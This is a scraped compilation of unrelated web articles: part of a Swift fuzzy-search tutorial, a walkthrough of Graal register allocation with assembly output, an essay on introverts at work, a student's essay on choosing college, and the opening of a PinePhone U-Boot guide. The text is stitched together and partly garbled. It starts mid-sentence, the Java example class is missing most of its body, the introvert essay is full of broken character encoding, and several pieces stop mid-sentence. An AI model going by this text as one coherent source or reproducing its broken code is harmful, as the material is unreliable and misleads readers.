<code>e</code>, we almost certainly want to match both <code>e</code> and <code>E</code>. Likewise, we might want to give bonus points when a matched character comes immediately after a separator such as <code>/</code>, <code>.</code> or <code>_</code>.</p> <p>In the <a href="https://talk.objc.io/episodes/S01E212-scoring-results">second episode</a> of the series, we add scoring to the algorithm.</p> <h2>Better Scoring</h2> <p>Unfortunately, the scoring algorithm we described above still isn’t good enough, as it doesn’t calculate the <em>optimal score</em>. It matches characters <a href="https://en.wikipedia.org/wiki/Greedy_algorithm">greedily</a>. For example, if we search for the characters <code>string</code> in <code>source/string.swift</code>, it greedily matches the first <code>s</code>, computes the gap penalty for <code>ource/s</code> and then matches <code>tring</code>. To compute the optimal score we need to consider two cases when we find a match: we need to compute the case in which we accept the match, and the case in which we skip the character and try to find it later in the string. Then we simply take the maximum score of both options.</p> <p>We can implement that (naively) using a recursive algorithm:</p> <pre><code>extension Substring {
    func fuzzyMatch2(_ needle: Substring, gap: Int?) -&gt; Score? {
        guard !needle.isEmpty else { return Score() }
        guard !self.isEmpty else { return nil }

        let skipScore = { self.dropFirst().fuzzyMatch2(needle, gap: gap.map { $0 + 1 }) }
        if self.first == needle.first {
            guard let s = dropFirst().fuzzyMatch2(needle.dropFirst(), gap: 0)
                else { return nil }
            var acceptScore = Score()
            if let g = gap, g &gt; 0 {
                acceptScore.add(-g, reason: "Gap \(g)")
            }
            acceptScore.add(1, reason: "Match \(first!)")
            acceptScore.add(s)

            guard let skip = skipScore() else { return acceptScore }
            return Swift.max(skip, acceptScore)
        } else {
            return skipScore()
        }
    }
}
</code></pre> <p>Note that the algorithm above isn’t very fast because it does a lot more work than it needs to. However, the quality of the results is much better than before. Next up, let’s make it fast.</p> <h2>Fast and Correct Scoring</h2> <p>To make things faster, we can use <a href="https://en.wikipedia.org/wiki/Dynamic_programming">dynamic programming</a>. This means we break up our algorithm recursively in such a way that each step depends directly on the previous step, so that we can compute our result step by step. We can take inspiration from the <a href="https://en.wikipedia.org/wiki/Smith%E2%80%93Waterman_algorithm">Smith-Waterman algorithm</a> and build a two-dimensional matrix that holds the intermediate results. We build up this matrix row by row, where each row represents a character in the needle, and each column represents a character in the filename we’re looking at.</p> <p><img src="https://www.objc.io/images/blog/2020-08-18-matrix-9973e699.png" width="551" alt="Matrix representation"></p> <p>For example, when we search for <code>string</code> in the filename <code>str/testing.swift</code>, we start by matching the character <code>s</code>. In our current implementation, we have a zero penalty for starting gaps, and every matching character gets a score of one. That means that the first row in the matrix contains a score of one for each occurrence of <code>s</code>.</p> <p>The second row matches a <code>t</code>. When see a <code>t</code> we can compute the score by taking the maximum score of all values in the previous row that are to the left of our <code>t</code>. For each of those matches we compute <code>1 + previousScore - gapPenalty</code>. In this case, the final value in the second row is computed as <code>1 + 1 - 3</code>.</p> <p>The score for a filename is the maximum value in the bottom row. For the three filenames above, it’s 6, 6 and 1, respectively.</p> <p>In <a href="https://talk.objc.io/episodes/S01E214-from-recursion-to-loops">episode 4</a> of the series, we migrate from our recursive algorithm to this matrix-based version. In the <a href="https://github.com/objcio/S01E214-quick-open-from-recursion-to-loops">sample code</a> we also provide a GUI that visualizes the matrix, which is great for debugging. When you’re playing around with scoring functions this can be very helpful.</p> <h2>Optimizations</h2> <p>The advantage of a fuzzy search is that we can get to our file very quickly without having to type many characters. This means that the algorithm has to be both correct, yielding the best possible results with few characters, and fast. Now that our algorithm is matrix-based with a few loops, we can make it fast. Our unoptimized version searches 20,000 files (the Swift code base) in about 400ms; to make it <em>feel</em> fast we want it to run in under 16ms, which is the time for a display pass when rendering at 60 frames per second.</p> <p>There are a number of different techniques we show in the series. As a first step, we changed our algorithm to work on <code>UTF8View</code> instead of <code>String</code>, which brought the running time down to about 100ms. Because of Swift’s built-in collections, this change is very simple to make. We further improve efficiency by working on arrays of UTF-8 code units (i.e. bytes) and reached 80ms.</p> <p>In our algorithm, we loop over the previous row to find the maximum score for the previous character in our needle. Rather than starting at the beginning of that row, we can start at the index of the first match. Caching the index brought it down to 45ms.</p> <p>Up until this point our algorithm was a generic method that worked on any <code>Collection</code> type as long as the <code>Element</code> was <code>Equatable</code>. Once we changed it to be a method on <code>Array</code> we could make use of the fact that <code>Array</code> has integer indices, which helps us achieve 37ms.</p> <p>As a final optimization, we parallelized the search by splitting our array of file names into chunks. Matching the number of chunks to processor cores gave us the best results. This lets us search 20,000 files in about 11ms, and comfortably achieve 60 fps. The benchmarks were done while recording our screen, which seems to slow everything down by quite a bit; without screen recording we saw running times of around 6ms. We can even search the ~70,000 files of the Linux kernel code base in under 16ms.</p> <p>These optimizations are documented in the <a href="https://talk.objc.io/episodes/S01E215-optimizing-performance">fifth</a> and <a href="https://talk.objc.io/episodes/S01E216-optimizing-performance-part-2">sixth</a> episode of the series.</p> <p>There are probably a number of further optimizations we could attempt, some of which we discuss in the final episode, but for our purposes the algorithm is fast enough.</p> <h2>Conclusion</h2> <p>We optimized our searching algorithm quite heavily by changing it from a recursive algorithm to a dynamic programming algorithm that builds up intermediate results. This allowed us to further optimize by working on different data structures (UTF-8 bytes instead of Unicode characters), doing less work (e.g. caching some values), and doing work in parallel.</p> <p>You can <a href="https://talk.objc.io/collections/quick-open">watch us discuss and implement these optimizations</a> by <a href="https://talk.objc.io/subscribe">subscribing to Swift Talk</a>.

<p>When the Java Virtual Machine compiles your Java code to machine code, one of the jobs it needs to do is to decide where to store Java local variables and other similar temporary values. Your machine has no concept of local variables, so during compilation we need to decide what location in the stack memory, or in a machine register, it’ll use for each variable. This is called <em>register allocation</em>. Register allocation may seem like a complex, abstract, theoretical concept, but in this short post we’re going to show how we can relate the original Java code first to the theory, then to how the compiler sees it, and then to the resulting machine code. What we want to show is that we can easily see the concepts working in practice in a real compiler.</p>

<p>We’re going to be showing output of the Graal just-in-time compiler, but the concepts are similar for other Java just-in-time and ahead-of-time compilers, and for compilers for many other languages.</p>

<p>This Java code runs the method <code>test</code> in a loop to trigger compilation. There is a <code>read</code> method to produce values, a <code>write</code> method to consume them, and a <code>barrier</code> method that simplifies some things and we’ll explain it in the end notes.</p>

<div><div><pre><code><span>class</span> <span>Test</span> <span>{</span>

        <span>barrier</span><span>();</span>

    <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We’re going to look at the register allocation in the <code>test</code> method. We’ve removed the calls to <code>barrier</code> between each line for simplicity.</p>

<div><div><pre><code><span>int</span> <span>v0</span> <span>=</span> <span>read</span><span>();</span>
<span>int</span> <span>v1</span> <span>=</span> <span>read</span><span>();</span>
<span>write</span><span>(</span><span>v0</span><span>);</span>
<span>int</span> <span>v2</span> <span>=</span> <span>read</span><span>();</span>
<span>int</span> <span>v3</span> <span>=</span> <span>read</span><span>();</span>
<span>write</span><span>(</span><span>v1</span><span>);</span>
<span>write</span><span>(</span><span>v2</span><span>);</span>
<span>write</span><span>(</span><span>v3</span><span>);</span>
</code></pre></div></div>

<p>We can reason about the register allocation for this program just by looking at the Java code. We want to think about how long each variable needs to be stored for. We call this the <em>live ranges</em>, or <em>intervals</em>. We can do this by drawing a table with each line of code being a line, and having a column for each variable, with a bar showing how long the variable needs to be stored until it can be forgotten.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/java-1.png" alt="java-1"></p>

<p>The key observation here is that we’ve got four variables that we need to keep alive, but it looks like we can probably fit them into just three storage locations. See how the bars for <code>v0</code> and <code>v2</code> never overlap. <code>v0</code> can be discarded before <code>v2</code> is ever created, so we could re-use the storage for <code>v0</code> for <code>v2</code> later on. We could instead share storage for <code>v0</code> and <code>v3</code> if we wanted to, but let’s use a <em>first-fit</em> approach and re-use the first storage location that’s available.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/java-2.png" alt="java-2"></p>

<p>A more formal way to look at register allocation is to build a graph where each variable is a node, and there are edges between the nodes if they’re live at the same time. This is an <em>interference graph</em>.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/graph.png" alt="graph"></p>

<p>Then we solve the problem of giving each node a color, so that adjacent nodes never have the same color. This is <em>graph coloring</em>. We could solve the problem by giving each node a unique color, but we already know this is wasteful.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/graph-unique.png" alt="graph-unique"></p>

<p>We can see the two solutions we already came up with.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/graph-1.png" alt="graph-1">
<img src="https://chrisseaton.com/truffleruby/register-allocation/graph-2.png" alt="graph-1"></p>

<p>To now see how Java allocates storage in practice, we can use <a href="https://github.com/graalvm/graalvm-ce-builds/releases/tag/vm-20.1.0">GraalVM CE 20.1 Java 8</a> to compile the Java code as normal.</p>

<div><div><pre><code>% ./graalvm-ce-java8-20.1.0/Contents/Home/bin/javac Test.java
</code></pre></div></div>

<p>We can then run it with some flags set to see what it does with the code. We use <code>-XX:CompileOnly=Test::test</code> so that the calls to <code>read</code>, <code>write</code> and <code>barrier</code> do not inline. If they did inline it would allow the compiler to significantly restructure the program and would obscure what we’re looking for. We use <code>-Dgraal.Dump=:3</code> to write out how the compiler understands the program to a file we can inspect later. We use <code>-XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly</code> to print the resulting machine code as assembly. We’ll need <a href="https://lafo.ssw.uni-linz.ac.at/pub/graal-external-deps/hsdis/intel/"><code>hsdis</code></a> in the current directory in order to run this.</p>

<div><div><pre><code>% ./graalvm-ce-java8-20.1.0/Contents/Home/bin/java -XX:CompileOnly=Test::test -Dgraal.Dump=:3 -XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly Test
</code></pre></div></div>

<p>Now we’re going to use a tool called the <a href="https://github.com/chrisseaton/c1visualizer/releases/tag/v1.7">c1visualizer</a>. This tool allows us to look at the how the compiler understands your program in the back-end, when it’s generating code and allocating storage locations to variables.</p>

<div><div><pre><code>% jdkhome=./graalvm-ce-java8-20.1.0/Contents/Home ./c1visualizer/bin/c1visualizer
</code></pre></div></div>

<p>On the left we can see the program move through various phases of the compilation back-end.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/c1visualizer.png" alt="c1visualizer"></p>

<p>If we look at <em>Before stack slot allocation</em>, we can see <code>v0</code> to <code>v3</code>. In this view, the variables are rows, and the now each column is a Java bytecode instruction in the method, so it’s been rotated ninety degrees. We can see the same four intervals we had in the source code.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/virtual.png" alt="virtual"></p>

<p>If we look at <em>After stack slot allocation</em>, we can see it’s now allocated machine stack locations for these variables. These numbers are the offset from the start of the stack frame. They don’t go up by four each time, as they are byte addresses, and we’re storing a Java <code>int</code> which is four bytes, and they don’t start at zero as Java stores some other information on the stack beside our variables. We also can see it’s done what we did with pencil-and-paper - it’s stored <code>v0</code> and <code>v2</code> in the same stack location - they’re both in <code>stack:28</code>.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/concrete.png" alt="concrete"></p>

<p>Finally, we can look at the disassembled machine code generated by the compiler. We’ve simplified it slightly for clarity and we’re still removing the calls to <code>barrier</code>. Each time we call <code>read</code> it returns the value in the <code>%eax</code> register, so an instruction <code>mov %eax,0x14(%rsp)</code> is for example storing the return value into <code>0x14(%rsp)</code>, which is another way to write <code>%rsp + 0x14</code>. <code>%rsp</code> is the stack pointer, so stack locations are addressed relative to the bottom of the current stack (bottom because it grows downward.)</p>

<div><div><pre><code>sub    $0x28,%rsp
mov    %rbp,0x20(%rsp)
callq  read
mov    %eax,0x14(%rsp)
callq  read
mov    %eax,0x10(%rsp)
mov    0x14(%rsp),%esi
callq  write
callq  read
mov    %eax,0x14(%rsp)
callq  read
mov    %eax,0xc(%rsp)
mov    0x10(%rsp),%esi
callq  write
mov    0x14(%rsp),%esi
callq  write
mov    0xc(%rsp),%esi
callq  write
mov    0x20(%rsp),%rbp
add    $0x28,%rsp
</code></pre></div></div>

<p>We can see again, that the first and third calls to <code>read</code> - that’s <code>v0</code> and <code>v2</code> - return a value that is stored into the same location - <code>0x14(%rsp)</code>. <code>v1</code> goes into <code>0x10(%rsp)</code> and <code>v3</code> into <code>0xc(%rsp)</code>. We can draw the same table for this machine code as we did for our Java code.</p>

<p><img src="https://chrisseaton.com/truffleruby/register-allocation/machine.png" alt="machine"></p>

<p>The point of all this is <em>all these diagrams match up in practice</em>! The pencil-and-paper reasoning of the Java code with tables and interference graphs that an undergraduate might do in an exam, matches up with how the production compiler understands it, and matches up with the machine code produced and run. We can see the theory working in practice, pretty directly.</p>

<h2 id="notes">Notes</h2>

<p>We talked about <em>variables</em> being allocated to <em>storage locations</em>. What we really mean by variable is anything that the compiler may want to store - they may not correspond to any real local variables, and not every local variable is necessarily stored.</p>

<p>We started talking about <em>register</em> allocation, but then generalized that to <em>storage location</em>, and then the compiler actually used the stack and no registers. The reason for this is that the values are live across calls, and HotSpot’s internal calling convention does not have any callee-saved registers - the caller must ensure all values are out of registers and saved on the stack.</p>

<p>The purpose of the <code>barrier</code> call is that without it the live ranges shrink somewhat due to them not having to be kept alive for as long, so that they end up not overlapping as we intend. We turned off inlining because without it our <code>barrier</code> call would not work as intended.</p>

<p>The actual register allocation algorithm Graal is using is the <em>linear scan</em> algorithm.</p>

<p>If you noticed that the stack locations shown by the c1visualizer don’t match the offsets in the machine code, it’s because they count in different directions and c1visualizer is also accounting for the return address on the stack. If you noticed that there is apparently empty space in the stack frame, which is due to an extra slot used during deoptimization, and alignment.</p>

<p>Tom Rodriguez helped me answer some questions about the HotSpot calling convention and frame layout.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>Life as an introvert</strong> is rarely easy. Ever since I graduated, Iâ€™ve been compelled to work in open-plan offices. Itâ€™s exhausting. Imagine being engaged in a task that requires high concentration, such as looking for a lost earing in the middle of a tennis court. Now imagine that an automatic ball launcher keeps shooting balls directly at you. Wouldnâ€™t you get tired quickly, and be much less efficient in your search? This is how I feel during my work, when sudden and repeating distractions are â€˜shotâ€™ at or near my desk.</p>
<p>The struggle of an introvert doesnâ€™t end in the office. Networking at conferences, some with thousands of attendees, is a central part of an academic career. Picture yourself entering a huge hall, with bright neon lights, hundreds of people in each aisle, and a background din that forces you to yell to be heard. In a typical two-hour poster session, youâ€™re expected to acquire the information you need while also efficiently introducing your own work to colleagues. As an introvert, the experience is equal to riding a terrifying rollercoaster while having to maintain a big smile on your face.</p>
<p>I wish I could say these types of challenge are limited to the work environment, but thatâ€™s not the case. For my most recent birthday, a friend bought me a dinner at EatWith â€“ a meal-sharing platform. Youâ€™re invited to dine in the house of strangers who cook for you and other participating guests. I would enjoy the food and cultural experience if I didnâ€™t have to go through the excruciating labour of small talk with random people. â€˜Sounds like fun,â€™ I said politely to my friend, but privately my immediate sense was that this was yet another ill-designed platform for introverts.</p>
<p>Today, as a psychologist, I know that introversion is a <a href="https://www.pewresearch.org/science/2015/12/11/personality-and-interest-in-science-health-topics/">common</a> trait. Unlike shyness, which is more about a fear of being judged negatively, introversion is defined as a preference for quiet, less stimulating environments. The Swiss psychoanalyst Carl Jung was the first to propose differentiating individuals along an introvert-extravert axis. Writing in the 1920s, he <a href="http://www.cyjack.com/cognition/(ebook%20pdf)%20jung,%20carl%20-%20the%20psychological%20types.pdf">described</a> introverts as preferring to direct their attention inward, to their own feelings and thoughts, and how they lose energy during social interactions. Extraverts, by contrast, direct their attention outward, gain energy from social interactions, and lose energy during periods of solitude.</p>
<p>Beginning in the 1950s, the German-born psychologist Hans Eysenck proposed a physiological explanation for the difference between introverts and extraverts. Extraverts, he <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/j.2044-8295.1964.tb00912.x">said</a>, have a lower baseline level of cortical arousal relative to introverts, leading them to search for external stimulation to increase their motivation, attention and alertness. Introvertsâ€™ higher baseline arousal levels, in contrast, lead them to withdraw. Contemporary psychology still considers the introversion-extraversion distinction a core aspect of personality (it is one of the <a href="https://psycnet.apa.org/record/1991-09869-001">so-called</a> â€˜Big Fiveâ€™ traits), although it is seen as a continuous spectrum along which we are all positioned, rather than a dichotomous state.</p>
<p>Although thereâ€™s no definitive way of identifying the proportion of introverts in the population, Susan Cain, an influential thinker in the field, has made a reasonable <a href="https://www.penguin.co.uk/books/296/296443/quiet-power/9780241977910.html">estimate</a> that at least a third of people are at one end of this spectrum. The third on the other end are extraverts, and the final third fall somewhere in between â€“ some <a href="https://www.tandfonline.com/doi/abs/10.1207/s15327752jpa4305_14">call</a> these people â€˜ambivertsâ€™. Knowing that introverts comprise an approximately equal share of the population as extraverts, I keep wondering about the missing 33 per cent â€“ where are all the introverts in the ocean of extraverts that surround me in my daily life?</p>
<p>Many of the decisions relating to the daily life of introverts are in the hands of extraverts</p>
<p><strong>While I have introverted</strong> friends, they seem to be vastly outnumbered by my extraverted friends and acquaintances. I have to remind myself that this apparent absence from my daily landscape is not surprising: we introverts are much harder to notice. Introverts probably wonâ€™t be the ones sharing a joke with the entire office, waiting by the coffee machine for a chance to chat, or appearing on television screens as rising reality-show stars. On the contrary, theyâ€™re more likely to enjoy some quiet time by themselves or with a few selected friends, to process their thoughts silently before saying them out loud, and to retreat to their quiet-place to recharge after social interactions.</p>
<p>While the higher visibility of extraverts is self-explanatory, it is far from trivial. Not only does it mean introversion is perceived as less common than it really is, but also introverts are less likely to be evenly represented in influential social groups, including in politics. We risk missing the immense contribution of a large percentage of our employees, students, trainees and friends.</p>
<p>For <a href="https://journals.sagepub.com/doi/10.1177/0894439312462802">example</a>, extraverts are more likely to take part in political engagements, such as disseminating political messages and signing petitions, both on the internet and offline. Negative political messages, which seem so common nowadays, <a href="https://jspp.psychopen.eu/article/view/280">deter</a> introverts from participating in politics, while having the opposite influence on extraverts, including increasing their likelihood of voting, rallying or volunteering for a political campaign. Extraverts are more <a href="https://www.sciencedirect.com/science/article/pii/S0747563209001472">active</a> on social media. They also have easier access to higher corporate ranks, due to the high attention they draw to themselves and to social <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/fire.12173">stereotypes</a> that associate extravert characteristics with leadership. This state of affairs leaves many of the decisions relating to the daily life of introverts in the hands of the extraverts.</p>
<p>Unfortunately, the greater representation of extraverts in social and political life is self-perpetuating. Working conditions chosen by extraverts to suit extraverts increase the burden on introverts. For instance, group meetings, in which each participant contributes thoughts in a disorganised, dominance-based manner, can put introverts at a disadvantage. The overabundance of extraverts in managing and recruitment roles also decreases the likelihood of introverts winning promotion due to whatâ€™s <a href="https://psycnet.apa.org/record/2016-02267-014">called</a> the â€˜similarity biasâ€™ â€“ our tendency to prefer people who are similar to ourselves. This is not only unfair to introverts, itâ€™s to the detriment of organisations.</p>
<p>Leadership is commonly associated with extraversion, but history teaches us that introverts can serve as powerful leaders. Rosa Parks, a leading activist in the American civil rights movement, was quiet and reserved. Her brave actions, more than her words, led to a crucial turning-point in the struggle. Similarly, while serving as US president, Barack Obama eagerly protected his solitude in the evenings, spending the time reading and concentrating on work decisions. His preference for small group outings rather than big social events didnâ€™t deprive him of extraordinary communication skills and the ability to make bold decisions. In <a href="https://www.tandfonline.com/doi/abs/10.1080/10904018.2016.1202770">contrast</a> to the mistaken perception of introverts as snobbish, misanthropic or depressed, we can be highly empathic, with strong communicative skills.</p>
<p>But itâ€™s not a case of establishing whether introverts or extraverts make better leaders, rather each brings something different, and diversity is often key to effective leadership. For <a href="https://link.springer.com/article/10.1007/s11365-014-0334-3">instance</a>, entrepreneurial teams perform better when leadership is shared between individuals, but only if they have diverse personality traits. Moreover, teams dominated by extraverted members <a href="https://psycnet.apa.org/record/2011-15936-006">actually</a> perform better under introverted leaders, possibly due to their greater responsiveness to their employeesâ€™ ideas.</p>
<p>Introversion is not something to be fixed â€“ but a blessed source of human diversity</p>
<p>The main cultural problem is that introverts are widely seen as not adapted to the environment, instead of it being acknowledged that the environment is designed to profit extraverts. Societyâ€™s praise and acceptance of extraversion as the norm has led many introverts, along with many ambiverts, to suppress different aspects of their personality, or to see them as flaws. This state of affairs is bad not only for introverts, but for society as a whole.</p>
<p><strong>The bias begins already</strong> in the first grade of school. Learning in a big classroom environment might be cost-efficient, but is by no means the best model for everyone. Some kids, especially the introverts, will struggle in the continuous company of a large number of others and the constant requirement to engage in group work. The same misconception â€“ placing the onus on introverts to change â€“ is also reflected in the recent <a href="https://psycnet.apa.org/record/2011-18181-001">proposal</a> that introverts would be happier if only they â€˜acted more extravertedâ€™, even if acting this way counteracts their natural tendencies.</p>
<p>Simple changes across society could be made to mitigate the inequities faced by introverts. In the educational system, for example, designated private spaces in schools could enable periodic shelter for those introverted kids and others who need a place to recharge. Introverts could also profit from greater access to online learning and sharing platforms, with asynchronous communication <a href="https://link.springer.com/chapter/10.1007/978-1-4471-0625-8_15">enabling</a> them to think and research an area without the pressure to respond immediately. Creating equal opportunities for participation in class, such as giving students time to think, the autonomy to decide to work alone or to write their ideas instead of presenting them verbally, could also help rebalance the traditional inequity.</p>
<p>In business and academic settings, workers should have more autonomy in choosing their working conditions. In meetings, stating the topics to be discussed in advance could allow more time for introverts to prepare and process the information. Allocating time for each attendee to speak could also give introverts the chance to express their thoughts. There should be more questioning of whether group meetings are necessarily the best platform for disseminating …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-37b97e2792cec9751559"><div><p><em>Before we start I want to note that these are my thoughts and what I think is right. I may be wrong and if I am I’d love for</em><a href="https://www.juandavidcampolargo.com/contact" target="_blank"> you to prove me wrong.&nbsp;</a></p><p>Lots of smart people have written about why you shouldn't go to college. But I'm giving it a shot.</p><p>Yeah, you read that right. I’m going to college despite the argument of many people of why people shouldn’t go to college.&nbsp;</p><p>I want to study engineering because I want to get the foundation of specialization in a method of thinking. I want to have one strong foundational skill that I can build on.</p><p>Many say college isn't worth it. And I want to add perspective to this debate as an entrepreneur, immigrant, and optimist.&nbsp;</p><p>Richard Hamming said once, “If you do not work on an important problem, it’s unlikely you’ll do important work.” Hamming gave a talk titled You and Your Research, which has made me think about my decisions and future projects, especially for solving <strong>important problems.&nbsp;</strong></p><p>The most important problems will require a more technical background and solid foundation where a combination of inspiration and a strong foundation will be key.&nbsp;</p><p>I asked Patrick Collision, one of the youngest billionaires and founders of Stripe, about what he thought about college. He said that teenagers like me (17) should keep learning for about 5 or 7 years before they commit to a plan of action of starting a venture. Learning does not mean college, it means going in-depth in your field of study to see the opportunities only an expert would identify.&nbsp;</p><p>I fell into the trap of starting and committing to ideas too early when I didn’t have the foundations. For instance, I wanted to create an app to translate Google Docs into other formats across the web. I needed to learn like 4 programming languages, API, authentication, and the list goes on. That just wasn’t viable, not impossible. I still want to do it and I’m learning to make it happen, but it’s an example of how you can fall into that trap.&nbsp; <strong>Exactly what Collison said </strong>about starting too early.</p><p>Hold on a second.<br></p><p>Why would Patrick say this? Didn’t he drop out of college not once, but twice? I couldn’t resist challenging him and asked, Don’t you see the contradiction here, why would he advise us the opposite of what he did?&nbsp;</p><p>He laughed and said that in certain fields the knowledge required is deeper, more specialized, and needs more study time and commitment. The learning curve is just too steep. He said we should be wary of starting too early, depending on the type of innovation we want to get involved in.&nbsp;</p><p>He also said that software forgives youngsters as you can get good at it by working and creating apps, websites, or programs. Patrick gave the example of how if he wanted to start a biotech company, he really couldn’t because of how much he’d need to learn.&nbsp;</p><p>Patrick makes a good point. But he forgot to say something he did. The two times he went to college, he was always working on projects. For me, going to college means I will learn and work on projects.&nbsp;</p><p>I will learn and create things. Hopefully, these ventures don’t take off because I won’t think twice [1].&nbsp; I shouldn’t try to choose between college &amp; working on projects but choose both. College and my projects should be related, and I should use college to leverage my projects and endeavors.&nbsp;</p><p>In college I plan on creating startups, working with professors on research, commercializing findings, creating patents, products, and anything that comes my way. The opportunities are limitless and I plan to find and take advantage of the opportunities that I can <strong>only find at college </strong>[2]<strong>.&nbsp;</strong></p><p>A big motivation for people going to college is “networking.” Is meeting people important? Sure yeah, but do you remember the time we’re living? We can meet anyone by clicking a button.&nbsp;</p><p>The networking thing isn’t solid enough and lacks independent thinking. <strong>Hello? </strong>We have LinkedIn and Twitter and whatever else. Others say they found valuable friendships and learned how to socialize with others. Sure? I don’t even know what to say about this. Perhaps it’s because I read <em>How to Win Friends and Influence People.</em> Just kidding (mostly).</p><p>College networking is more transformational than just meeting people. The connection is far different when you work and live with these people for four years, especially because of the intimate and emotional experiences with them. The emergencies, all-nighters to study for exams, parties, volunteering, heartbreaks, etc. They don’t happen online. They only happen in person, and usually in college.&nbsp;</p><p>You can be holed up working on projects and hustling, you can party and not care about grades, or you can have the best of both worlds.</p><p>There are other places where you can find these opportunities to meet people and learn how to talk to people such as working on a job, starting a company, going to events, and putting yourself out there. Sure, but not in a collegiate environment [3].</p><h2>The Engineer Entrepreneur&nbsp;</h2><p>Look, I’m going to college to learn something hard such as engineering and science. Something I can mostly only do there.&nbsp;</p><p>If I study engineering, I could come back and learn pretty much anything else. If I study soft sciences, I can’t really come back and study engineering. I also know that the best way to really learn engineering is to engineer stuff via building, and not necessarily in college.&nbsp;</p><p>I’m aware I may not like engineering, or perhaps I will change to study something else. We’ll see. I’m probably not going to be the “best engineer.” And that is OK! I probably don’t want to be the best engineer, it’s too hard and too risky. I intend to become a “<a href="https://pmarchive.com/guide_to_career_planning_part2.html#:~:text=Seek%20to%20be%20a%20double%2Ftriple%2Fquadruple%20threat." target="_blank">double, triple, or quadruple threat</a>.”&nbsp;</p><p>Scott Adams says there are mostly two paths to a remarkable life. He advises:</p><blockquote><p>If you want an average successful life, it doesn’t take much planning. Just stay out of trouble, go to school, and apply for jobs you might like. But if you want something extraordinary, you have two paths:</p><p>1. Become the best at one specific thing.</p><p>2. Become very good (top 25%) at two or more things.</p></blockquote><p>That’s what I intend to do.&nbsp; A good example of complementing skills is Patrick Collison who combines coding, leadership, and business. He’s a great coder but probably not the best in the world. The same with leadership and business. When you combine these skills that are rarely found together, you get someone like Patrick Collison.&nbsp;</p><p>I already have the entrepreneurial mindset for ideas and adaptability.&nbsp;</p><p>I've been a person who started businesses and selling things since I was a little kid. I’d sell <a href="https://collectibles.paniniamerica.net/store/col_usa_en" target="_blank">Panini World Cup</a> stickers at school to my friends. Sometimes I wouldn’t even finish my album because I’d sold so many of the stickers. I’d sell cheese to companies, friends, my mom’s clients, anywhere, or anyone. That's how I was.&nbsp;</p><p>I was an entrepreneur before the word entrepreneur became buzzy. I didn’t even know the word because I knew no English.&nbsp;</p><p>Then, when I moved to the U.S. at 13, I started more companies, including a digital marketing agency. I was always doing. I was always learning (<a href="http://juandavidcampolargo.com/blog/highschool" target="_blank">Read my Journey through High School</a>).</p><p>Some skills I’m improving are public speaking, writing, speaking different languages, finance and economics, big picture-oriented, international leadership, and boldness.&nbsp;</p><p>I’m more like Andrew Carnegie and Cyrus McCormick category who commercialize and innovate with technology, and not necessarily invent the technologies. Although I want to be more of an entrepreneur than a technologist, it will be extremely useful to get a solid background and put the effort to do so.&nbsp;</p><p>In the era of <a href="https://www.juandavidcampolargo.com/blog/leverage" target="_blank">leverage</a>, we don’t need credentials, money, or distribution. As long as you solve a problem people care about, you can get started at any age, come from any field or country, need little or no money. Just start and use free distribution channels like social media to reach people.&nbsp;</p><p>A <a href="https://www.adamtank.com/" target="_blank">friend</a> pointed out an interesting point. He said that you don't need a degree (including engineering) to change how society functions or build something yourself. But you do need a degree if you want to work within what society has built, because the structure requires it.<br></p><p><strong>I want to work within what society has built to positively change how society functions.&nbsp;</strong></p><p>Engineering and science are fascinating and being able to use them to create and build things is my <strong>dream. </strong>Not only build but also research. I look up to people like Pasteur who engaged in research and engineering inventions. I’m as passionate for fundamental science questions as I am for innovating with technology.&nbsp;</p><h2>Should <strong>You </strong>Go to college? Think For Yourself.&nbsp;</h2><p>I’m going to college in a weird, transitory time. Perhaps students in 5-10 years won’t have to go to college because someone made a better system. Who knows?</p><p>Or maybe people will skip college and go to graduate school. I don’t know. I don’t have the answer.</p><p>But what I do have is <strong>my</strong> <strong>answer</strong>. Going to college is a personal question related to your goals and ambitions. Ask yourself, What the hell do I want to do? If you don’t know, ask people who know you (parents, family, friends, etc) to tell you what you’re good at or what they see you doing in 10 years.&nbsp;</p><p>They know you. That doesn’t mean they’re always right, but they can give you a valuable hint where to look and go.&nbsp;</p><p>Once you have something that you want to do (or at least some idea), see and think for yourself whether going to college makes sense.&nbsp;</p><p>If you want to do business, going to college isn’t as valuable as starting a company, and so on.&nbsp;</p><p>And again, going to college to meet people and network isn’t convincing as you can meet exceptional people on the internet. I don’t buy it. However, you could make a different type of relationship, usually more meaningful.</p><p>Most important of all, think from <a href="https://jamesclear.com/first-principles" target="_blank">first principles</a> and think for yourself.&nbsp;</p><p>What does that mean?&nbsp;</p><p>Ignore the mainstream, especially those who have not accomplished the goals you want to accomplish. If you want to become a doctor, why would you listen to an entrepreneur? If you want to become an entrepreneur, why would you listen to a lawyer? If you want …</p></div></div></div>

<h2 id="introduction">Introduction</h2>

<p>If you are in a hurry to update U-Boot and the SPL on your PinePhone, then please proceed directly to <a href="#write-u-boot-plus-spl-to-bootable-storage">Write U-Boot+SPL to bootable storage</a>.</p>

<p>In this article, I am going to explain what U-Boot, SoC and the SPL are. After that, I will describe the sunxi bootable storage layout as well as the PinePhone boot procedure, so you will understand what you will be updating and why. Then, I will teach you how to determine if an upgrade is required, and I will explain two different ways of upgrading U-Boot. As a special treat for the curious, I will show you the first steps to reverse engineer the U-Boot+SPL firmware blob. I hope this article peeks your curiosity and encourages you to learn more.</p>

<p>Discussed on <a href="https://news.ycombinator.com/item?id=24244407">Hacker News</a> and <a href="https://forum.pine64.org/showthread.php?tid=11099">Pine64</a>.</p>

<h2 id="what-is-u-boot">What is U-Boot?</h2>

